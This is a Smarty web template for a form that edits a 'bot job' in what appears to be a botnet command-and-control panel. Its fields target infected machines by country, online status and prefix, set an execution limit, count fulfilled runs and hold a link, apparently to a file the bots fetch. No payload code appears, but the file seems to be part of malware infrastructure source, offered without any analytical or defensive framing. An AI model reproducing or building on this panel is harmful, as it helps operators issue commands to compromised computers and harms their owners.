<div id="div_sub_{$rand_name}"></div>
<script language="javascript" type="application/javascript">
var id_{$rand_name} = document.getElementById('div_sub_{$rand_name}').parentNode.id.replace('_content', '');
document.getElementById(id_{$rand_name} + '_title').innerHTML = '{$lang.editcmd}';

function submit_{$rand_name}(){
return get_hax({
	url:'/bots/jobs_edit-{$Cur.id}.html?window=1',
	method: document.forms['edit_cmd{$rand_name}'].method,
	form: 'edit_cmd{$rand_name}',
	id: id_{$rand_name} + '_content',
});
}

</script>
<form action="/bots/jobs_edit-{$Cur.id}.html?window=1" name="edit_cmd{$rand_name}" id="edit_cmd{$rand_name}" enctype="application/x-www-form-urlencoded" method="post">
<table cellspacing="1" cellpadding="0" style="width: 100%; border: 1px solid #cccccc;">
<tr class="bgp2">
<th style="text-align: left; width: 300px;">{$lang.cmdtype} (<a onclick="alert('{$lang.vibtyz}');" style="cursor:pointer">?</a>):</th>
<th style="text-align: left;">{$cmd->str} ({$cmd->type})</th>
</tr>
<tr class="bgp1">
    <th colspan="2">&nbsp;</th>
</tr>
<tr class="bgp2">
    <th style="text-align: left;">{$lang.country} (<a onclick="alert('{$lang.vsiskbdz}');" style="cursor:pointer">?</a>):</th>
    <th style="text-align: left;">
    <select name="country[]" class="user" style="width:100%; height: 160px;" multiple="multiple">
    <option value="" selected="selected">{$lang.all}</option>
    {foreach from=$country item=c}<option value="{$c->code}">{$country_code[$c->code]}</option>{/foreach}
    </select>
    </th>
</tr>
<tr class="bgp1">
    <th colspan="2">&nbsp;</th>
</tr>
<tr class="bgp2">
    <th style="text-align: left;">{$lang.status} (<a onclick="alert('{$lang.cvksbdk}');" style="cursor:pointer">?</a>):</th>
    <th style="text-align: left;">
    <select name="status" class="user" style="width:100%">
    <option value="3" {if $cmd->online eq 3}selected="selected"{/if}>{$lang.cnb}</option>
    <option value="2" {if $cmd->online eq 2}selected="selected"{/if}>{$lang.czb}</option>
    <option value="1" {if $cmd->online eq 1}selected="selected"{/if}>{$lang.alls}</option>
    </select>
    </th>
</tr>
<tr class="bgp1">
    <th colspan="2">&nbsp;</th>
</tr>
<tr class="bgp2">
    <th style="text-align: left;">{$lang.fulfilled}:</th>
    <th style="text-align: left;">{$cmd->count}</th>
</tr>
<tr class="bgp1">
    <th colspan="2">&nbsp;</th>
</tr>
<tr class="bgp2">
    <th style="text-align: left;">{$lang.ogpk} (<a onclick="alert('{$lang.cvkddkpk}');" style="cursor:pointer">?</a>):</th>
    <th style="text-align: left;"><input type="text" name="limit" class="user" style="width:100%" value="{$smarty.post.limit}" /></th>
</tr>
<tr class="bgp1">
    <th colspan="2">&nbsp;</th>
</tr>
<tr class="bgp2">
    <th style="text-align: left;">{$lang.cogdz} (<a onclick="alert('{$lang.cdoldzeo}');" style="cursor:pointer">?</a>):</th>
    <th style="text-align: left;">{if $cmd->lt eq 2}Да{else}Нет{/if}</th>
</tr>
<tr class="bgp1">
    <th colspan="2">&nbsp;</th>
</tr>
<tr class="bgp2">
    <th style="text-align: left;">{$lang.pref} (<a onclick="alert('{$lang.cvoinp}');" style="cursor:pointer">?</a>):</th>
    <th style="text-align: left;">
    {if $_SESSION.user->config.prefix eq ''}
    <select name="prefix[]" class="user" style="width:100%; height: 140px;" multiple="multiple">
    <option value="" {if $smarty.post.prefix eq '*'}selected="selected"{/if}>{$lang.all}</option>
    {foreach from=$prefix item=p}<option value="{$p}"{if isset($pset[{$p}])}selected="selected"{/if}>{$p}</option>{/foreach}
    </select>
    {else}
    {$_SESSION.user->config.prefix}
    {/if}
    </th>
</tr>
<tr class="bgp1">
    <th colspan="2">&nbsp;</th>
</tr>
<tr class="bgp2">
    <th style="text-align: left;">{$lang.clinks}:</th>
    <th style="text-align: left;"><input type="text" name="link" class="user" style="width:100%" value="{$cmd->link}" /></th>
<tr class="bgp1">
    <th colspan="2">&nbsp;</th>
</tr>
<tr class="bgp2">
    <th colspan="2" style="text-align: left;"><input type="button" name="submit" class="user" style="width:100%" value="{$lang.edit}" onclick="submit_{$rand_name}();" /></th>
    </tr>
</table>
</form>